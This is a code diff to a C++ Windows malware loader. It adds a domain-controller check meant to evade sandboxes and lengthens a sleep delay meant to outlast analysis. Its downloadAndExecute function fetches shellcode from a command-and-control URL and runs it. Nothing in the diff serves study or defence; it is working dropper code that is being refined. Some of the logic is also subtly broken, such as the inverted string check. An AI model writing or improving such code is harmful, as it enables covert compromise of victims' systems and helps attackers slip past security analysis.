@@ -35,8 +35,26 @@ bool memoryCheck() {
     }
 }
 
-int downloadAndExecute() {
+bool isDomainController() {
+    // Windows sandboxes are usually not configured as AD Domain Controller, so let's check...
+    // (Only useful if you _know_ your target is a DC)
+    LPCWSTR dcName;
+    string dcNameComp;
+    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
+    wstring ws(dcName);
+    string dcNewName(ws.begin(), ws.end());
+    cout << dcNewName;
+    if (dcNewName.find("\\\\")) {
+        return FALSE;
 
+    }
+    else {
+        return TRUE;
+    }
+}
+
+int downloadAndExecute() {
+    // Download a shellcode via HTTP and execute.
     HANDLE hProcess;
     SIZE_T dwSize = SHELLCODE_SIZE;
     DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
@@ -52,7 +70,7 @@ int downloadAndExecute() {
     char buff[SHELLCODE_SIZE];
     unsigned long bytesRead;
     string s;
-    // Open URL stream and download payload
+    // Open URL stream and download payload.
     URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
     while (true) {
         stream->Read(buff, SHELLCODE_SIZE, &bytesRead);
@@ -72,10 +90,10 @@ int downloadAndExecute() {
 
 int main() {
     // Try to sleep through sandbox...
-    Sleep(60000);
+    sleep(300); // sleep_timer in seconds, arround 5 min. should be realistic tho...
     
-    // Only drop and run payload if we are not sandboxed (-anymore-)...
-    if memoryCheck() == true {
+    // Only drop and run our payload if we are not sandboxed (-anymore-)...
+    if ((memoryCheck() == true) and (isDomainController() == true)) {
         downloadAndExecute();
     }
     else {
